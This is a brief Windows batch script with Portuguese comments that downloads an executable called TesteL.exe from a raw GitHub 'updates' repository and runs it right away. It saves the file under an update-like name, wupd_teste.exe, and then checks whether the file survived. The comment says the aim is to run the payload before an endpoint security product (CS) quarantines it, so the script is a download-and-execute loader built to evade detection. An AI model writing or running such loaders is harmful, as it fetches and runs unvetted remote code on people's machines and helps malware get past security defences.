@echo off
rem Teste PURO do payload na maquina com CS: baixa e roda na mesma corrida (o CS quarentena exe novo em ~segundos)
set R=https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main
if not exist "C:\lab" mkdir "C:\lab"
echo baixando TesteL.exe...
curl.exe -s -o C:\lab\wupd_teste.exe %R%/TesteL.exe
echo rodando (UAC: Sim)...
start "" C:\lab\wupd_teste.exe
timeout /t 4 >nul
dir C:\lab\wupd_teste.exe
